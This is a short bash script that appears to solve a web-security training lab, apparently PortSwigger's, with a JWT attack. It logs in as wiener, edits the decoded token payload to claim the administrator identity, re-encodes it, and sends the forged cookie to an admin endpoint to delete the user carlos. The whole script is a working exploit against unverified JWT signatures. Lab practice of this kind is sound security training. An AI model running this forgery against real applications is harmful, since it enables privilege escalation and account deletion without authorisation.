#!/bin/bash

source ../common.hook

USERNAME='wiener'
PASSWORD='peter'

login $USERNAME $PASSWORD

decode_jwt

DECODED_JWT_PAYLOAD=$(echo $DECODED_JWT_PAYLOAD | sed "s/wiener/administrator/g")
output "Modified payload: $DECODED_JWT_PAYLOAD" INFO
encode_jwt

curl "${PS_URL}/admin/delete?username=carlos" -H "Cookie: session=${JWT}" 

eval_result $PS_URL
